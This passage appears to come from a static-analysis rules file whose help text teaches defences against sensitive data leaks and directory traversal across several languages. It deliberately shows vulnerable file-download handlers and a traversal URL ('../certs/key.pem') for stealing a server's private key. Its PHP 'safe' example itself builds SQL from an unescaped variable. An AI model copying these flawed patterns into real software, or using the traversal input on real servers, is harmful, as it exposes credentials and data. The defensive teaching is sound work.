\nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://docs.shiftleft.io/ngsast/product-info/coverage#vulnerabilities",
                            "id": "Secret%20Keyword/7748cb426e974900c554439338a47602b39f275687ce5d3499705dd39be77c5b",
                            "name": "Secret Keyword",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "5.5",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 5.5",
                                    "Generic Secret",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Secret Keyword"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "HTTP input data is used as part of a file path to read a file on the server without escaping or validation. This indicates a directory traversal vulnerability."
                            },
                            "help": {
                                "markdown": "HTTP input data is used as part of a file path to read a file on the server without escaping or validation. This indicates a directory traversal vulnerability.\n\n# Directory Traversal\n\n**Directory traversal** vulnerabilities allow attackers to access arbitrary files on your server by manipulating HTTP\nparameters to include relative path syntax. It is important that you treat any parameters used to refer to files\nsecurely, or an attacker will be able to read sensitive data from your file system. Even better, avoid direct references\nto filenames altogether and use opaque identifiers and indirection instead.\n\n::::tabs\n\n:::tab[Java]\n\nPassing file paths in URLs is dangerous. Consider the following Java application that hosts menus for a restaurant:\n\n```java\npublic class UnsafeFileDownloadServlet\n{\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Taking the unfiltered filename from the HTTP request is dangerous -\n         * an attacker can use the \"../\" syntax in a filename to climb out of\n         * the intended directory.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String menuDirectory = \"/var/etc/menus\";\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + fileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + fileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `FilenameUtils.getBaseName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```java\nimport org.apache.commons.io.FilenameUtils;\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException\n    {\n        /**\n         * Removing anything except alphanumeric characters (and periods) will\n         * stop access to arbitrary directories.\n         */\n        final String fileName      = request.getParameter(\"menu\");\n        final String safeFileName  = FilenameUtils.getBaseName(fileName);\n        final String menuDirectory = \"/var/etc/menus\";\n\n\tif (\"\".equals(safeFileName) || \".\".equals(safeFileName) || \"..\".equals(safeFileName)) {\n\t    throw new SystemException(\"refusing to read a special directory name\");\n\t}\n\n        response.setContentType(\"application/pdf\");\n        response.setHeader(\"Content-disposition\", \"attachment; filename=\" + safeFileName);\n\n        try (OutputStream out = response.getOutputStream()) {\n            File file = new File(menuDirectory + File.separator + safeFileName);\n            Files.copy(file.toPath(), out);\n        }\n    }\n}\n```\n\nIn Java web applications you can have the server take care of this for you. The following configuration safely mounts \nthe `/var/etc/menus` directory as static content in a Jetty web-server:\n\n```xml\n<Configure class=\"org.eclipse.jetty.server.handler.ContextHandler\">\n  <Set name=\"contextPath\">/menus</Set>\n  <Set name=\"handler\">\n    <New class=\"org.eclipse.jetty.server.handler.ResourceHandler\">\n      <Set name=\"resourceBase\">/var/etc/menus</Set>\n      <Set name=\"directoriesListed\">false</Set>\n    </New>\n  </Set>\n</Configure>\n\n```\n\n:::\n\n:::tab[C#]\n\n## Directory Traversal in C#\n\nPassing file paths in URLs is dangerous. Consider the following ASP.NET Core controller method that hosts menus for a \nrestaurant:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult UnsafeFileDownload([FromQuery] string menu)\n    {\n        byte[] fileBytes = System.IO.File.ReadAllBytes(\"Static/menus/\" + menu);\n        return File(fileBytes, \"application/pdf\", menu);\n    }\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to use a method like `Path.GetFileName` that strips any potential directory\ncomponents from a path. That only leaves `.`, `..` and the empty string as\nspecial cases that could lead to unexpected behavior:\n\n```csharp\n    [HttpGet(\"menus\")]\n    public IActionResult SaferFileDownload([FromQuery] string menu)\n    {\n        string baseName = System.IO.Path.GetFileName(menu);\n        if (baseName != \"\" && baseName != \".\" && baseName != \"..\") {\n            byte[] fileBytes    = System.IO.File.ReadAllBytes(\"Static/menus/\" + baseName);\n\n            return File(fileBytes, \"application/pdf\", menu);\n        } else {\n            return Forbid();\n        }\n    }\n```\n\nIn most web-servers you can have the server take care of this for you. The following snipped shows how to use the \nASP.NET Core Static File Middleware to safely mount the `/Static/Menus` directory as static content:\n\n```csharp\n  // This method gets called by the runtime. Use this method to configure the HTTP request pipeline.\n  public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n  {\n      if (env.IsDevelopment())\n      {\n          app.UseDeveloperExceptionPage();\n          app.UseMigrationsEndPoint();\n      }\n      else\n      {\n          app.UseExceptionHandler(\"/Home/Error\");\n          app.UseHsts();\n      }\n      \n      app.UseHttpsRedirection();\n      \n      // Mount the standard 'wwwroot' directory so files are accessible over HTTP.\n      app.UseStaticFiles();\n      \n      // Mount the local 'static/menus' directory so files are accessible over HTTP under the '/menus' path.\n      app.UseStaticFiles(new StaticFileOptions\n      {\n          FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"Static/Menus\")),\n          RequestPath = \"/menus\"\n      });\n      \n      app.UseRouting();\n\n      app.UseEndpoints(endpoints =>\n      {\n          endpoints.MapControllerRoute(\n              name: \"default\",\n              pattern: \"{controller=Home}/{action=Index}/{id?}\");\n          endpoints.MapRazorPages();\n      });\n   } \n```\n\n:::\n\n:::tab[JavaScript]\n\n## Directory Traversal in JavaScript\n\nPassing file paths in URLs is dangerous. Consider the following Express application that hosts menus for a restaurant:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu?menu=breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu?menu=lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu?menu=dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\nconst path = require('path')\n\napp.get('/menu', (request, response) => {\n\n  /**\n   * Taking the unfiltered filename from the HTTP request is dangerous -\n   * an attacker can use the \"../\" syntax in a filename to climb out of\n   * the intended directory.\n   */\n  const menuPath = path.resolve('menus/', request.query.menu)\n\n  response.download(menuPath)\n})\n```\n\nHere the name of the menu corresponds to a file on disk, which is being passed in the query string parameter. An \nattacker can set this `menu` parameter to anything they choose, and use the `../` syntax to access other directories. In \nfact, the URL `/menus?menu=../certs/key.pem` will let them download the server's private key kept in a directory next \nto the menus.\n\nIf you take file paths from the HTTP request, make sure to strip any characters that can be used in files paths, such as \n`/`, `..`, `\\` and`~`. These characters vary by operating system and can be encoded in subtle ways, so it's generally \nbest to disallow *all* non-alphanumeric characters:\n\n```javascript\napp.get('/menu', (request, response) => {\n\n  /**\n   * Removing anything except alphanumeric characters (excluding the extension) will\n   * stop access to arbitrary directories.\n   */\n  const suppliedFilename = request.query.menu\n  const match            = suppliedFilename.match(/([a-z0-9]+)\\.([a-z]+)/i)\n  const scrubbedFileName = match[1] + '.' + match[2]\n\n  const menuPath = 'menus/' + scrubbedFileName\n\n  response.download(menuPath)\n})\n```\n\nIn Express, you can have the server take care of this for you. The following code mounts the `/menus` directory as\nstatic content safely:\n\n```javascript\nconst express = require('express')\nconst app     = express()\n\napp.get('/', (request, response) => {\n  response.send(\n    `<div>\n       <h1>Click on a menu to download it</h1>\n       <p><a href=\"/menu/breakfast.pdf\"> Breakfast </a></p>\n       <p><a href=\"/menu/lunch.pdf\">     Lunch     </a></p>\n       <p><a href=\"/menu/dinner.pdf\">    Dinner    </a></p>\n     </div>`)\n})\n\n// Tell Express that the /menu directory contains static files that should be made\n// available to the browser.\napp.use('/menu', express.static('menus'))\n```\n\n:::\n\n:::tab[Python]\n\n## Directory Traversal in Python\n\nPassing file paths in URLs is dangerous. Consider the following Flask application that hosts menus for a restaurant:\n\n```python\n@app.route('/menus')\ndef download_menu():\n  \"\"\"An insecure static file handler that allows directory traversal attacks.\"\"\"\n\n  filename         = request.args.get('menu')\n  static_directory = os.fspath(app.menu_folder)\n\n  # The construction of the path here is incredibly insecure!\n  # If a path contains the \"..%2F\" pattern, it will be treated as\n  # ../ and a hacker can climb out of the static directory.\n  